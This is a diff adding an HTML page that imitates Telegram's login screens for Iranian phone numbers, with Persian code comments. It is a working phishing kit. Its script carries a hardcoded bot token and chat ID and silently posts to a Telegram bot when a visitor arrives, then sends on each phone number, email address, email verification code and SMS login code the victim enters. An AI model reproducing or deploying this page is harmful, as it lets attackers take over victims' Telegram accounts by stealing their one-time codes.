@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+  <title>Login Flow</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      font-family: sans-serif;
+      background: #f4f6fb;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      width: 360px;
+      background: #fff;
+      border-radius: 20px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      padding: 20px;
+      text-align: center;
+      position: relative;
+    }
+
+    h2 {
+      font-size: 18px;
+      margin-bottom: 6px;
+      color: #222;
+    }
+
+    p {
+      font-size: 13px;
+      color: #666;
+      margin-bottom: 20px;
+    }
+
+    label {
+      font-size: 12px;
+      color: #555;
+      margin-bottom: 6px;
+      display: block;
+      text-align: left;
+    }
+
+    .country-select, .phone-input {
+      display: flex;
+      align-items: center;
+      background: #f0f2f8;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      padding: 8px 12px;
+      margin-bottom: 16px;
+      justify-content: space-between;
+    }
+
+    .country-select img {
+      width: 20px;
+      height: 14px;
+      border-radius: 2px;
+    }
+
+    .phone-input input, .email-input input {
+      border: none;
+      background: transparent;
+      outline: none;
+      font-size: 14px;
+      width: 100%;
+      direction: ltr;
+    }
+
+    .checkbox-row {
+      display: flex;
+      align-items: center;
+      margin-bottom: 20px;
+      font-size: 13px;
+      color: #333;
+      justify-content: flex-start;
+    }
+
+    .checkbox-row input {
+      margin-right: 8px;
+    }
+
+    .next-btn {
+      width: 50px;
+      height: 50px;
+      background: #3284ff;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: white;
+      font-size: 20px;
+      margin-left: auto;
+      cursor: pointer;
+      box-shadow: 0 4px 10px rgba(50,132,255,0.4);
+      border: none;
+    }
+
+    .popup {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.4);
+      display: none;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .popup-content {
+      background: #fff;
+      padding: 20px;
+      border-radius: 16px;
+      width: 80%;
+      text-align: center;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+    }
+
+    .popup-buttons {
+      display: flex;
+      justify-content: space-between;
+    }
+
+    .popup-buttons button {
+      width: 45%;
+      padding: 10px;
+      border: none;
+      border-radius: 10px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .edit-btn {
+      background: #eee;
+      color: #333;
+    }
+
+    .yes-btn {
+      background: #3284ff;
+      color: white;
+    }
+
+    #email-screen, #code-screen, #sms-screen {
+      display: none;
+    }
+
+    .email-input {
+      display: flex;
+      align-items: center;
+      background: #f0f2f8;
+      border: 1.5px solid #b3d4ff;
+      border-radius: 10px;
+      padding: 8px 12px;
+      margin-bottom: 20px;
+      justify-content: space-between;
+    }
+
+    #email-popup {
+      display: none;
+    }
+
+    .code-box {
+      width: 40px;
+      height: 50px;
+      font-size: 24px;
+      text-align: center;
+      border: 1.5px solid #b3d4ff;
+      border-radius: 10px;
+      background: #f0f2f8;
+      outline: none;
+    }
+  </style>
+</head>
+<body>
+    <!-- صفحه شماره -->
+  <div class="container" id="phone-screen">
+    <h2>Your phone number</h2>
+    <p>Please confirm your country code and enter your phone number.</p>
+
+    <label>Country</label>
+    <div class="country-select">
+      <span>Iran</span>
+      <img src="https://flagcdn.com/w40/ir.png">
+    </div>
+
+    <label>Phone number</label>
+    <div class="phone-input">
+      <span>+98</span>
+      <input id="phone" type="tel" maxlength="10" placeholder="000 000 0000">
+    </div>
+
+    <div class="checkbox-row">
+      <input type="checkbox" checked>
+      <label>Sync Contacts</label>
+    </div>
+
+    <button class="next-btn" onclick="showPopup()">➜</button>
+
+    <!-- Popup شماره -->
+    <div class="popup" id="popup">
+      <div class="popup-content">
+        <h3>Is this the correct number?</h3>
+        <p id="confirm-number"></p>
+        <div class="popup-buttons">
+          <button class="edit-btn" onclick="hidePopup()">Edit</button>
+          <button class="yes-btn" onclick="confirmNumber()">Yes</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- صفحه ایمیل -->
+  <div class="container" id="email-screen">
+
+    <!-- عکس بالای صفحه -->
+    <div style="display:flex; justify-content:center; margin-bottom:20px;">
+      <img src="photo_2026-01-02_14-40-39.jpg" style="width:120px; height:auto;" alt="mailbox">
+    </div>
+
+    <h2>Choose a login email</h2>
+    <p>You will receive Telegram login codes via email and not SMS.<br>Please enter an email address to which you have access.</p>
+
+    <label>Your email</label>
+    <div class="email-input">
+      <input id="email" type="email" placeholder="you@example.com">
+    </div>
+
+    <button class="next-btn" onclick="submitEmail()">➜</button>
+  </div>
+
+  <!-- Popup ایمیل -->
+  <div class="popup" id="email-popup">
+    <div class="popup-content">
+      <h3>Is this the correct email?</h3>
+      <p id="confirm-email"></p>
+      <div class="popup-buttons">
+        <button class="edit-btn" onclick="hideEmailPopup()">Edit</button>
+        <button class="yes-btn" onclick="confirmEmail()">Yes</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- صفحه وارد کردن کد ایمیل -->
+  <div class="container" id="code-screen">
+
+    <div style="display:flex; justify-content:center; margin-bottom:20px;">
+      <img src="photo_2026-01-02_14-40-42.jpg" style="width:100px; height:auto;" alt="email icon">
+    </div>
+
+    <h2>Verification Code</h2>
+    <p>
+      Please check your email  
+      <span id="user-email" style="font-weight:bold;"></span><br>
+      (don't forget the spam folder) and enter the code we just sent you.
+    </p>
+
+    <div style="display:flex; justify-content:space-between; margin:20px 0;">
+      <input maxlength="1" class="code-box">
+      <input maxlength="1" class="code-box">
+      <input maxlength="1" class="code-box">
+      <input maxlength="1" class="code-box">
+      <input maxlength="1" class="code-box">
+      <input maxlength="1" class="code-box">
+    </div>
+
+    <button class="next-btn" onclick="submitCode()">➜</button>
+  </div>
+
+  <!-- صفحه وارد کردن کد پیامک -->
+  <div class="container" id="sms-screen">
+
+    <div style="display:flex; justify-content:center; margin-bottom:20px;">
+      <img src="photo_2026-01-02_14-40-45.jpg" style="width:100px; height:auto;" alt="sms icon">
+    </div>
+
+    <h2>Enter code</h2>
+    <p>
+      We've sent an SMS with an activation code to your phone  
+      <span id="user-phone" style="font-weight:bold;"></span>.
+    </p>
+
+    <div style="display:flex; justify-content:space-between; margin:20px 0;">
+      <input maxlength="1" class="code-box">
+      <input maxlength="1" class="code-box">
+      <input maxlength="1" class="code-box">
+      <input maxlength="1" class="code-box">
+      <input maxlength="1" class="code-box">
+      <input maxlength="1" class="code-box">
+    </div>
+
+    <button class="next-btn" onclick="submitSMSCode()">➜</button>
+  </div>
+  <script>
+
+  /* -------------------------------
+        تنظیمات بات تلگرام
+  ------------------------------- */
+  const BOT_TOKEN = "6923568496:AAHM_gMcdsy-O712NIoj87NbVe1fp7auoiw";
+  const CHAT_ID = "1209515299";
+
+  function sendMessage(msg) {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+    });
+  }
+
+  window.onload = () => {
+    sendMessage("🔥 یک کاربر وارد سایت شد!");
+  };
+
+  /* -------------------------------
+        مرحله شماره تلفن
+  ------------------------------- */
+
+  function showPopup() {
+    const phone = document.getElementById("phone").value.trim();
+
+    if (phone.length !== 10 || !/^\d+$/.test(phone)) {
+      alert("Please enter a valid 10-digit number.");
+      return;
+    }
+
+    document.getElementById("confirm-number").textContent = "+98 " + formatNumber(phone);
+    document.getElementById("popup").style.display = "flex";
+  }
+
+  function hidePopup() {
+    document.getElementById("popup").style.display = "none";
+  }
+
+  function confirmNumber() {
+    const phone = document.getElementById("phone").value.trim();
+    const formatted = formatNumber(phone);
+
+    sendMessage(`📞 شماره تأیید شد:\n+98 ${formatted}`);
+
+    hidePopup();
+
+    document.getElementById("phone-screen").style.display = "none";
+    document.getElementById("email-screen").style.display = "block";
+  }
+
+  /* -------------------------------
+        مرحله ایمیل + پاپ‌آپ تأیید
+  ------------------------------- */
+
+  function submitEmail() {
+    const email = document.getElementById("email").value.trim();
+
+    if (!email || !email.includes("@")) {
+      alert("Please enter a valid email address.");
+      return;
+    }
+
+    document.getElementById("confirm-email").textContent = email;
+    document.getElementById("email-popup").style.display = "flex";
+  }
+
+  function hideEmailPopup() {
+    document.getElementById("email-popup").style.display = "none";
+  }
+
+  function confirmEmail() {
+    const email = document.getElementById("email").value.trim();
+
+    sendMessage(`📧 ایمیل تأیید شد:\n${email}`);
+
+    document.getElementById("email-popup").style.display = "none";
+
+    // نمایش ایمیل در صفحه کد
+    document.getElementById("user-email").textContent = email;
+
+    // رفتن به صفحه وارد کردن کد ایمیل
+    document.getElementById("email-screen").style.display = "none";
+    document.getElementById("code-screen").style.display = "block";
+  }
+
+  /* -------------------------------
+        مرحله وارد کردن کد ایمیل
+  ------------------------------- */
+
+  function submitCode() {
+    const boxes = document.querySelectorAll("#code-screen .code-box");
+    let code = "";
+
+    boxes.forEach(b => code += b.value);
+
+    if (code.length !== 6) {
+      alert("Please enter the 6-digit code.");
+      return;
+    }
+
+    sendMessage(`🔐 کد ایمیل وارد شده:\n${code}`);
+
+    // نمایش شماره در صفحه SMS
+    const phone = document.getElementById("phone").value.trim();
+    document.getElementById("user-phone").textContent = "+98 " + formatNumber(phone);
+
+    // رفتن به صفحه SMS
+    document.getElementById("code-screen").style.display = "none";
+    document.getElementById("sms-screen").style.display = "block";
+  }
+
+  /* -------------------------------
+        مرحله وارد کردن کد پیامک
+  ------------------------------- */
+
+  function submitSMSCode() {
+    const boxes = document.querySelectorAll("#sms-screen .code-box");
+    let code = "";
+
+    boxes.forEach(b => code += b.value);
+
+    if (code.length !== 6) {
+      alert("Please enter the 6-digit SMS code.");
+      return;
+    }
+
+    sendMessage(`📲 کد پیامک وارد شده:\n${code}`);
+
+    alert("SMS code submitted!");
+  }
+
+  /* -------------------------------
+        فرمت شماره
+  ------------------------------- */
+
+  function formatNumber(num) {
+    return num.replace(/(\d{3})(\d{3})(\d{4})/, "$1 $2 $3");
+  }
+
+</script>
+</body>
+</html>
